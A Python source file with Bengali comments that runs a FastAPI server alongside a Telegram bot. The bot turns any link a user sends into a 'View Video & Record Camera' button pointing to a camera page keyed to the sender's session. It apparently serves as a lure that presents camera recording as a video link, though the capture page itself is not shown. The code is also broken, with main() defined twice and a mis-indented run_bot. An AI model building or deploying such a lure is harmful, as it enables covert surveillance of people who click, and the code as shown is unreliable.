import os
import json
import asyncio
from fastapi import FastAPI, UploadFile, File
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters, CallbackQueryHandler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup

# --- Configuration ---
# Render-এর Environment Variable থেকে টোকেন নেবে, না পেলে এরর দেবে
BOT_TOKEN = os.getenv("BOT_TOKEN") 
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN Environment Variable-এ সেট করা নেই!")
APP_URL = "https://your-render-app-url.onrender.com"  # Render থেকে Public URL পASTE করুন

app = FastAPI()

# ✅ FIX: static ফোল্ডার না থাকলে স্বয়ংক্রিয়ভাবে তৈরি হবে
os.makedirs("static", exist_ok=True)

# Static files এর জন্য ফোল্ডার মাউন্ট (যাতে index.html রেন্ডার করতে পারে)
app.mount("/static", StaticFiles(directory="static"), name="static")

# --- Telegram Bot Functions ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Link দিন")

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_link = update.message.text
    
    # ভিডিও লিংক জেনারেট করা (এখানে আমরা একটি ইউনিক ID ব্যবহার করে ক্যামেরা পেজে নিয়ে যাব)
    # বাস্তবে আপনি এখানে YouTube/FB লিংক পিজিউরিং করতে পারেন, কিন্তু 
    # সহজ রাখার জন্য আমরা শুধু ক্যামেরা রেকর্ডিং ফোকাস করব।
    
    # আমরা একটি ইউনিক সেশন আইডি তৈরি করছি যাতে বট জানে কে কোন ভিডিও পাঠালো
    session_id = f"{update.message.from_user.id}_{int(update.message.date.timestamp())}"
    
    # ক্যামেরা পেজের লিংক তৈরি করা (যেখানে index.html থাকবে)
    camera_page_url = f"{APP_URL}/static/index.html?session={session_id}&source_link={user_link}"

    keyboard = [
        [InlineKeyboardButton("View Video & Record Camera", url=camera_page_url)]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"আপনার ভিডিও লিংক: {user_link}\n\nনিচের বাটনে ক্লিক করুন ক্যামেরা রেকর্ড করতে:",
        reply_markup=reply_markup
    )

async def main():
    # Bot Application তৈরি
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    start_handler = CommandHandler('start', start)
    link_handler = MessageHandler(filters.TEXT & (~filters.COMMAND), handle_link)
    
    application.add_handler(start_handler)
    application.add_handler(link_handler)

    print("Telegram Bot is running...")
    
    # FastAPI এবং Bot একসাথে রান করার জন্য একটি লুপ তৈরি করা হচ্ছে
    import uvicorn
    
    async def run_bot():
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    # idle() বাদ দিয়ে Event ব্যবহার করা হলো
    stop_event = asyncio.Event()
    try:
        await stop_event.wait()
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        await application.updater.stop()
        await application.stop()
        await application.shutdown()

async def main():
    # দুটি প্রসেস একসাথে রান করা (Bot এবং Web Server)
    bot_task = asyncio.create_task(run_bot())
    
    # Render-এর পোর্ট নেওয়া হচ্ছে
    port = int(os.environ.get("PORT", 8000))
    config = uvicorn.Config(app, host="0.0.0.0", port=port, log_level="info")
    server = uvicorn.Server(config)
    
    web_task = asyncio.create_task(server.serve())
    
    await asyncio.gather(bot_task, web_task)

if __name__ == "__main__":
    asyncio.run(main())